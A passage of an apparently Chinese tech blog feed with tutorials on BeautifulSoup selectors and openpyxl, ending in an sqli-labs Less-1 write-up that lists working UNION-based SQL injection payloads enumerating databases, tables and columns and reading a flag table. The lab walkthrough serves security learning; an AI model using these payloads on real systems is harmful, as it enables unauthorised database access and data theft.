class=&quot;story&quot;&gt;...&lt;/p&gt;]</span><br></code></pre></div></td></tr></table></figure><p>返回结果中只有<code>&lt;p&gt;</code>标签没有<code>&lt;a&gt;</code>标签,因为<code>&lt;a&gt;</code>标签还定义了<code>id</code>,没有返回<code>&lt;html&gt;</code>和<code>&lt;head&gt;</code>,因为<code>&lt;html&gt;</code>和<code>&lt;head&gt;</code>中没有定义<code>class</code>属性.</p><p>下面代码找到所有被文字包含的节点内容:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> NavigableString<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">surrounded_by_strings</span>(<span class="hljs-params">tag</span>):</span><br><span class="hljs-keyword">return</span> (<span class="hljs-built_in">isinstance</span>(tag.next_element, NavigableString)<span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(tag.previous_element, NavigableString))<br><br><span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> soup.find_all(surrounded_by_strings):<br><span class="hljs-built_in">print</span> tag.name<br><span class="hljs-comment"># p</span><br><span class="hljs-comment"># a</span><br><span class="hljs-comment"># a</span><br><span class="hljs-comment"># a</span><br><span class="hljs-comment"># p</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BeautifulSoup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bs4help(2)</title>
    <link href="/2020/08/24/bs4help-2/"/>
    <url>/2020/08/24/bs4help-2/</url>
    
    <content type="html"><![CDATA[<p>BeautifulSoup系列文章</p><span id="more"></span><h1 id="BeautifulSoup库解析器"><a href="#BeautifulSoup库解析器" class="headerlink" title="BeautifulSoup库解析器"></a>BeautifulSoup库解析器</h1><table><thead><tr><th align="center">解析器</th><th align="center">使用方法</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">bs4的HTML解析器</td><td align="center">BeautifulSoup(mk,’html.parser’)</td><td align="center">安装bs4库</td></tr><tr><td align="center">lxml的HTML解析器</td><td align="center">BeautifulSoup(mk,’lxml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center">lxml的XML解析器</td><td align="center">BeautifulSoup(mk,’xml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center">html5lib的解析器</td><td align="center">BeautifulSoup(mk,’html5lib’)</td><td align="center">pip install html5lib</td></tr></tbody></table><h2 id="findAll"><a href="#findAll" class="headerlink" title="findAll()"></a>findAll()</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">findAll(name=<span class="hljs-literal">None</span>, attrs=&#123;&#125;, recursive=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">None</span>, limit=<span class="hljs-literal">None</span>, **kwargs)<br></code></pre></div></td></tr></table></figure><p>参数name 匹配tags的名字，获得相应的结果集。 有几种方法去匹配name<br>keyword参数用于筛选tag的属性<br>text 是一个用于搜索NavigableString对象的参数。 它的值可以是字符串，一个正则表达式， 一个list或dictionary，True或None<br>recursive 是一个布尔参数(默认为True)，用于指定Beautiful Soup遍历整个剖析树， 还是只查找当前的子标签或者剖析对象<br>设置limit 参数可以让Beautiful Soup 在找到特定个数的匹配时停止搜索</p><h3 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">&lt;&gt;<span class="hljs-string">.find</span><span class="hljs-params">()</span>搜索且只返回一个结果，同<span class="hljs-string">.find_all</span><span class="hljs-params">()</span>参数<br>&lt;&gt;<span class="hljs-string">.find_parents</span><span class="hljs-params">()</span>在先辈节点中搜索，返回列表类型，同<span class="hljs-string">.find_all</span><span class="hljs-params">()</span>参数<br>&lt;&gt;<span class="hljs-string">.find_parent</span><span class="hljs-params">()</span>在先辈节点中返回一个结果，同<span class="hljs-string">.find</span><span class="hljs-params">()</span>参数<br>&lt;&gt;<span class="hljs-string">.find_next_siblings</span><span class="hljs-params">()</span>在后续平行节点中搜索，返回列表类型，同<span class="hljs-string">.find_all</span><span class="hljs-params">()</span>参数<br>&lt;&gt;<span class="hljs-string">.find_next_sibling</span><span class="hljs-params">()</span>在后续平行节点中返回一个结果，同<span class="hljs-string">.find</span><span class="hljs-params">()</span>参数<br>&lt;&gt;<span class="hljs-string">.find_previous_siblings</span><span class="hljs-params">()</span>在前序平行节点中搜索，返回列表类型，同<span class="hljs-string">.find_all</span><span class="hljs-params">()</span>参数<br>&lt;&gt;<span class="hljs-string">.find_previous_sibling</span><span class="hljs-params">()</span>在前序平行节点中返回一个结果，同<span class="hljs-string">.find</span><span class="hljs-params">()</span>参数<br></code></pre></div></td></tr></table></figure><h2 id="css选择器"><a href="#css选择器" class="headerlink" title="css选择器"></a>css选择器</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> requests<br><span class="hljs-meta">&gt;&gt;&gt; </span>r = requests.get(<span class="hljs-string">&quot;http://python123.io/ws/demo.html&quot;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(r.text,<span class="hljs-string">&#x27;html.parser&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>Beautiful Soup支持大部分的CSS选择器 ,在 Tag 或 BeautifulSoup 对象的 .select() 方法中传入字符串参数,即可使用CSS选择器的语法找到tag</p><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.select(<span class="hljs-string">&quot;title&quot;</span>)<br>[&lt;title&gt;This is a python demo page&lt;/title&gt;]<br></code></pre></div></td></tr></table></figure><p>通过tag标签逐层查找</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.select(<span class="hljs-string">&quot;body a&quot;</span>)<br>[&lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt;, &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;]<br></code></pre></div></td></tr></table></figure><p>找到某个tag标签下的直接子标签</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>soup.select(<span class="hljs-string">&quot;body &gt; a&quot;</span>)<br>[]<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.select(<span class="hljs-string">&quot;body &gt; p&quot;</span>)<br>[&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;, &lt;p class=&quot;course&quot;&gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:<br><br>&lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt; and &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;]<br><span class="hljs-meta">&gt;&gt;&gt; </span>soup.select(<span class="hljs-string">&quot;body &gt; p:nth-of-type(1)&quot;</span>)<br>[&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;]<br></code></pre></div></td></tr></table></figure><p>找到兄弟节点标签</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">soup.select(<span class="hljs-string">&quot;#link1 ~ .sister&quot;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span><br><span class="hljs-comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot;  id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span><br><br>soup.select(<span class="hljs-string">&quot;#link1 + .sister&quot;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span><br></code></pre></div></td></tr></table></figure><h3 id="类"><a href="#类" class="headerlink" title="类"></a>类</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">soup.select(<span class="hljs-string">&quot;.sister&quot;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span><br><span class="hljs-comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span><br><span class="hljs-comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span><br><br>soup.select(<span class="hljs-string">&quot;[class~=sister]&quot;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span><br><span class="hljs-comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span><br><span class="hljs-comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span><br></code></pre></div></td></tr></table></figure><h3 id="id"><a href="#id" class="headerlink" title="id"></a>id</h3><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">soup.select(<span class="hljs-string">&quot;#link1&quot;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;]</span><br><br>soup.select(<span class="hljs-string">&quot;a#link2&quot;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]</span><br></code></pre></div></td></tr></table></figure><h3 id="属性查找"><a href="#属性查找" class="headerlink" title="属性查找"></a>属性查找</h3><h4 id="是否存在某个属性"><a href="#是否存在某个属性" class="headerlink" title="是否存在某个属性"></a>是否存在某个属性</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">soup.select(<span class="hljs-string">&#x27;a[href]&#x27;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span><br><span class="hljs-comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span><br><span class="hljs-comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span><br></code></pre></div></td></tr></table></figure><h4 id="通过属性的值查找"><a href="#通过属性的值查找" class="headerlink" title="通过属性的值查找"></a>通过属性的值查找</h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">asoup.select(<span class="hljs-string">&#x27;a[href=&quot;http://example.com/elsie&quot;]&#x27;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;]</span><br><br>soup.select(<span class="hljs-string">&#x27;a[href^=&quot;http://example.com/&quot;]&#x27;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span><br><span class="hljs-comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,</span><br><span class="hljs-comment">#  &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span><br><br>soup.select(<span class="hljs-string">&#x27;a[href$=&quot;tillie&quot;]&#x27;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]</span><br><br>soup.select(<span class="hljs-string">&#x27;a[href*=&quot;.com/el&quot;]&#x27;</span>)<br><span class="hljs-comment"># [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;]</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BeautifulSoup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>openpyxl(1)</title>
    <link href="/2020/08/19/openpyxl-1/"/>
    <url>/2020/08/19/openpyxl-1/</url>
    
    <content type="html"><![CDATA[<p>openpyxl简单使用</p><span id="more"></span><h1 id="openpyxl"><a href="#openpyxl" class="headerlink" title="openpyxl"></a>openpyxl</h1><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> openpyxl <span class="hljs-keyword">import</span> Workbook<br><span class="hljs-meta">&gt;&gt;&gt; </span>wb = Workbook()<br><span class="hljs-meta">&gt;&gt;&gt; </span>ws = wb.active<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(wb)<br>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">openpyxl</span>.<span class="hljs-title">workbook</span>.<span class="hljs-title">workbook</span>.<span class="hljs-title">Workbook</span>&#x27;&gt;</span><br><span class="hljs-class">&gt;&gt;&gt; <span class="hljs-title">type</span>(<span class="hljs-params">ws</span>)</span><br><span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">openpyxl</span>.<span class="hljs-title">worksheet</span>.<span class="hljs-title">worksheet</span>.<span class="hljs-title">Worksheet</span>&#x27;&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="查看已有的工作表"><a href="#查看已有的工作表" class="headerlink" title="查看已有的工作表"></a>查看已有的工作表</h2><p><img src="https://i.loli.net/2020/08/19/KXbcFBoJkHSudEw.jpg" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> openpyxl <span class="hljs-keyword">import</span> load_workbook<br><span class="hljs-meta">&gt;&gt;&gt; </span>wb = load_workbook(<span class="hljs-string">r&#x27;C:\Users\Mto\Desktop\test.xlsx&#x27;</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(wb.sheetnames)<br>[<span class="hljs-string">&#x27;Sheet&#x27;</span>, <span class="hljs-string">&#x27;Mysheet&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>ws = wb.active<br><span class="hljs-meta">&gt;&gt;&gt; </span>ws.title<br><span class="hljs-string">&#x27;Sheet&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>A1 = ws[<span class="hljs-string">&#x27;A1&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>A1<br>&lt;Cell <span class="hljs-string">&#x27;Sheet&#x27;</span>.A1&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>A1.value<br><span class="hljs-string">&#x27;A1&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>cell_range = ws[<span class="hljs-string">&#x27;A1&#x27;</span>:<span class="hljs-string">&#x27;C2&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>cell_range<br>((&lt;Cell <span class="hljs-string">&#x27;Sheet&#x27;</span>.A1&gt;, &lt;Cell <span class="hljs-string">&#x27;Sheet&#x27;</span>.B1&gt;, &lt;Cell <span class="hljs-string">&#x27;Sheet&#x27;</span>.C1&gt;), (&lt;Cell <span class="hljs-string">&#x27;Sheet&#x27;</span>.A2&gt;, &lt;Cell <span class="hljs-string">&#x27;Sheet&#x27;</span>.B2&gt;, &lt;Cell <span class="hljs-string">&#x27;Sheet&#x27;</span>.C2&gt;))<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">type</span>(A1)<br>&lt;<span class="hljs-class"><span class="hljs-keyword">class</span> &#x27;<span class="hljs-title">openpyxl</span>.<span class="hljs-title">cell</span>.<span class="hljs-title">cell</span>.<span class="hljs-title">Cell</span>&#x27;&gt;</span><br><span class="hljs-class">&gt;&gt;&gt; <span class="hljs-title">type</span>(<span class="hljs-params">cell_range</span>)</span><br><span class="hljs-class">&lt;<span class="hljs-title">class</span> &#x27;<span class="hljs-title">tuple</span>&#x27;&gt;</span><br><span class="hljs-class">&gt;&gt;&gt; <span class="hljs-title">for</span> <span class="hljs-title">row</span> <span class="hljs-title">in</span> <span class="hljs-title">ws</span>.<span class="hljs-title">values</span>:</span><br><span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> row:<br><span class="hljs-built_in">print</span>(value)<br>   <br>A1<br>B1<br>C1<br>D1<br>E1<br>A2<br>B2<br>C2<br>D2<br>E2<br>···········<br></code></pre></div></td></tr></table></figure><h3 id="Worksheet-iter-rows-函数"><a href="#Worksheet-iter-rows-函数" class="headerlink" title="Worksheet.iter_rows()函数"></a>Worksheet.iter_rows()函数</h3><figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel">&gt;&gt;&gt; for <span class="hljs-built_in">row</span> in ws.iter_rows(min_row=<span class="hljs-number">1</span>, max_col=<span class="hljs-number">3</span>, max_row=<span class="hljs-number">2</span>)<span class="hljs-symbol">:</span><br>for <span class="hljs-built_in">cell</span> in r<span class="hljs-symbol">ow:</span><br>print(<span class="hljs-built_in">cell</span>)<br><br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">A1</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">B1</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">C1</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">A2</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">B2</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">C2</span>&gt;<br></code></pre></div></td></tr></table></figure><h3 id="Worksheet-iter-cols-函数"><a href="#Worksheet-iter-cols-函数" class="headerlink" title="Worksheet.iter_cols()函数"></a>Worksheet.iter_cols()函数</h3><figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel">&gt;&gt;&gt; for col in ws.iter_cols(min_row=<span class="hljs-number">1</span>,max_col=<span class="hljs-number">3</span>,max_row=<span class="hljs-number">2</span>)<span class="hljs-symbol">:</span><br>for <span class="hljs-built_in">cell</span> in c<span class="hljs-symbol">ol:</span><br>print(<span class="hljs-built_in">cell</span>)<br><br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">A1</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">A2</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">B1</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">B2</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">C1</span>&gt;<br>&lt;<span class="hljs-built_in">Cell</span> &#x27;<span class="hljs-built_in">Sheet</span>&#x27;.<span class="hljs-symbol">C2</span>&gt;<br></code></pre></div></td></tr></table></figure><p>两个 Worksheet.iter_rows() 和 Worksheet.iter_cols() 可以采取 values_only 仅返回单元格值的参数，出于性能原因，Worksheet.iter_rows() Worksheet.iter_cols() 方法在只读模式下不可用。</p><figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less">&gt;&gt;&gt; <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">row</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">ws</span><span class="hljs-selector-class">.iter_rows</span>(min_row=<span class="hljs-number">1</span>,max_col=<span class="hljs-number">3</span>,max_row=<span class="hljs-number">2</span>,values_only=True):<br><span class="hljs-selector-tag">print</span>(row)<br><br>(<span class="hljs-string">&#x27;A1&#x27;</span>, <span class="hljs-string">&#x27;B1&#x27;</span>, <span class="hljs-string">&#x27;C1&#x27;</span>)<br>(<span class="hljs-string">&#x27;A2&#x27;</span>, <span class="hljs-string">&#x27;B2&#x27;</span>, <span class="hljs-string">&#x27;C2&#x27;</span>)<br></code></pre></div></td></tr></table></figure><p>如果需要遍历文件的所有行或列，则可以使用 Worksheet.rows 属性或 Worksheet.columns 属性</p><figure class="highlight python-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python-repl"><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">tuple</span>(ws.rows)</span><br><span class="hljs-meta">&gt;&gt;&gt;</span> <span class="python"><span class="hljs-built_in">tuple</span>(ws.columns)</span><br></code></pre></div></td></tr></table></figure><p>出于性能原因，Worksheet.rows Worksheet.columns 属性在只读模式下不可用</p><h2 id="创建工作表"><a href="#创建工作表" class="headerlink" title="创建工作表"></a>创建工作表</h2><figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean"><span class="hljs-keyword">from</span> openpyxl <span class="hljs-keyword">import</span> Workbook<br>wb=Workbook()#创建一个工作簿<br>ws=wb.active#获取工作的激活工作表<br>ws[<span class="hljs-string">&#x27;A1&#x27;</span>]=<span class="hljs-number">42</span>#在A1中插入内容<br>ws.append([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>])#这里其实是在第二行插入了<span class="hljs-number">3</span>个数字，占用了三个单元格<br>wb.save(<span class="hljs-string">&#x27;sample.xlsx&#x27;</span>)#保存到当前目录<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
    <tags>
      
      <tag>openpyxl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql-libs-less-1</title>
    <link href="/2020/08/17/sql-libs-less-1/"/>
    <url>/2020/08/17/sql-libs-less-1/</url>
    
    <content type="html"><![CDATA[<p>sql注入练习靶场，不稳定更新</p><span id="more"></span><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><blockquote><p>GET - Error based - Single quotes - String(基于错误的GET单引号字符型注入)</p></blockquote><p>存在字符型注入</p><p><img src="https://s1.ax1x.com/2020/08/17/dn9lt0.jpg" alt="img"></p><p>判断显示位</p><p><img src="https://s1.ax1x.com/2020/08/17/dn91hV.jpg" alt="img"></p><p>查看数据库</p><p>0’ union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p><p><img src="https://s1.ax1x.com/2020/08/17/dn9K7n.jpg" alt="img"></p><p>显示所有的表</p><p>-1’ union select 1,@@version, group_concat(table_name) from information_schema.tables where table_schema=’ctftraining’–+</p><p><img src="https://s1.ax1x.com/2020/08/17/dn9Qkq.jpg" alt="img"></p><p>-1’ union select 1,@@version, group_concat(column_name) from information_schema.columns where table_name=’flag’–+</p><p>-1’ union select 1, @@version 2,group_concat(table_name) from information_schema.tables where table_schema=’ctftraining’–+</p><p><img src="https://s1.ax1x.com/2020/08/17/dn9nmj.jpg" alt="img"></p><p>-1’ union select 1,@@version, group_concat(flag) from ctftraining.flag–+</p><p><img src="https://s1.ax1x.com/2020/08/17/dn9u0s.jpg" 